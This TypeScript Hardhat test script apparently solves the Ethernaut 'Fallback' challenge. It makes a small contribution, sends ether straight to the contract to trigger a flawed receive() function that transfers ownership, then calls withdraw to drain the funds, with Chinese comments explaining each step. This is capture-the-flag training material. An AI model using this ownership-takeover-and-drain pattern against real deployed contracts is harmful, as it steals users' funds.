import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Fallback`);
    const challengeAddress = await createChallenge(
        `0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F`
    );
    challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
    // 优先调用contribution来满足receive的条件
    const rep0 = await challenge.connect(eoa).contribute({
        value: ethers.utils.parseEther("0.0008"),

        gasPrice: ethers.utils.parseUnits("3", "gwei"),
        gasLimit: 2100000,
    });
    await rep0.wait();

    // 注意到该合约的receive方法有问题，所以向这个的合约发一笔钱, 就可以把这个合约的owner变为msg.sender
    let tx = {
        to: challenge.address,
        value: 100000,

        gasPrice: ethers.utils.parseUnits("3", "gwei"),
        gasLimit: 2100000,
    };
    const rep = await eoa.sendTransaction(tx);
    await rep.wait();
    const rep1 = await challenge.connect(eoa).withdraw({
        gasPrice: ethers.utils.parseUnits("3", "gwei"),
        gasLimit: 2100000,
    });
    await rep1.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
